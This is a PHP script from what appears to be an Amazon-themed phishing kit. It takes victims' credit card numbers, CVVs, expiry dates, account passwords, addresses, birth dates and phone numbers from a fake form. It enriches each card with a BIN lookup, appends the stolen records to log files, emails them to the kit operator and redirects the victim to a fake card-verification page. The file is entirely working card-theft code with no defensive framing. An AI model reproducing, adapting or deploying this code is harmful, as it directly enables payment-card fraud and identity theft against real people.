<?php


session_start();
$randomnumber = rand(1, 100);

include('../__CONFIG__.php');
require('../detect.php');
include '../Library/ClassFunction/curldataip.php';

// fungsi bin
$ncn     = $_POST['credit_card'];
$bin     = str_replace(' ', '', $ncn);
$bin     = substr($bin, 0, 7);
$ncn     = str_replace(' ', '', $ncn);
$c = curl_init();
curl_setopt($c, CURLOPT_URL, "https://lookup.binlist.net/$bin");
curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
$result = curl_exec($c);
curl_close($c);
$ident = json_decode($result);
$ccbrand = strtoupper($ident->scheme);
$ccbank =  strtoupper($ident->bank->name);
$cctype = strtoupper($ident->type);
$cclevel = strtoupper($ident->brand);
$valid = strtoupper($ident->number->luhn);
$_SESSION["scheme"] = $ccbrand;
$_SESSION["type"] = $cctype;
$_SESSION["category"] = $cclevel;
$_SESSION["bank"] = $ccbank;
//lanjuut

if (isset($_POST['Sex'])) {

	$_SESSION['email'] = $_POST['email'];
	$_SESSION['password'] = $_POST['password'];
	$_SESSION['fullname'] = $_POST['fullname'];
	$_SESSION['address1'] = $_POST['address1'];
	$_SESSION['address2'] = $_POST['address2'];
	$_SESSION['city'] = $_POST['city'];
	$_SESSION['state'] = $_POST['state'];
	$_SESSION['zip'] = $_POST['zip'];
	$_SESSION['country'] = $_POST['country'];
	$_SESSION['dob'] = $_POST['dob'];
	$_SESSION['phone'] = $_POST['phone'];
	$_SESSION['nameoncard'] = $_POST['nameoncard'];
	$_SESSION['credit_card'] = $_POST['credit_card'];
	$_SESSION['cvv_card'] = $_POST['cvv_card'];
	$_SESSION['month'] = $_POST['month'];
	$_SESSION['year'] = $_POST['year'];
	$name = $_POST['nameoncard'];

	$message = "
[+] ========. [ ❤️ Anti Log Server Anjing ❤️ ] .======= [+]

----------------Credit Card----------------------
Cardholder   : " . $_POST['nameoncard'] . "
Card number  : " . $_POST['credit_card'] . "
Expire       : " . $_POST['month'] . "/" . $_POST['year'] . "
Cvv          : " . $_POST['cvv_card'] . "
Check Copy   : " . $_POST['credit_card'] ."/".$_POST['month']."/". $_POST['year'] ."/". $_POST['cvv_card'] . "
Bin          : " . $bin . " " . $ccbrand . " " . $cctype . " " . $cclevel . " " . $ccbank ."
---------------Billing Info----------------------
Full Name    : " . $_POST['fullname'] . "
Address1     : " . $_POST['address1'] . "
Address2     : " . $_POST['address2'] . "
City         : " . $_POST['city'] . "
State        : " . $_POST['state'] . "
Zipcode      : " . $_POST['zip'] . "
Country      : " . $_POST['country'] . "
Phone        : " . $_POST['phone'] . "
Date of Birth: " . $_POST['dob'] . "
----------------PC Info--------------------------
IP         : " . $ip . " | " . $nama_negara . "
Browser    : " . $_SERVER['HTTP_USER_AGENT'] . "
[+] ========. [ ❤️ Time is Money and Bucin Always The best ❤️ ] .===== [+]
 ";
	$save = fopen("../../log/backup_cc.txt", "a+");
	fwrite($save, $message);
	fclose($save);
	$file2 = "../../log/cc.txt";
	$isi  = @file_get_contents($file2);
	$buka = fopen($file2, "w");
	fwrite($buka, $isi + 1);
	fclose($buka);
	$filev = fopen('../log/cc.txt', "a");
    $time = date('H:i dS F');
    fwrite ($filev, " IP $showIP Dari $showCountry Menginput CC\r\n ");
    fclose( $filev );
	$headers = "From: " . $name . "  <amazonCC-$randomnumber@freakzbrothers.team>";
	$subject = "16 Digit: " . $bin . " - " . $ccbrand . " " . $cctype . " " . $cclevel . " " . $ccbank . " - " . $ip . " - " . $nama_negara . " ";
	mail($to, $subject, $message, $headers);
	$empas = "# $bin - $ccbrand - $cctype - $cclevel - $ccbank - [" . $contin_name . "]\n";
	$file = fopen("../../log/bin.txt", "a");
	fwrite($file, $empas);
	fclose($file);

} else{
	# code...
}

if($ccbrand == null){
	header('Location: ../Acc_Billing?udm_cat_path=' . sha1(time()));;
} else {
	header('Location: ../verifiedby?udm_cat_path=' . sha1(time()));
}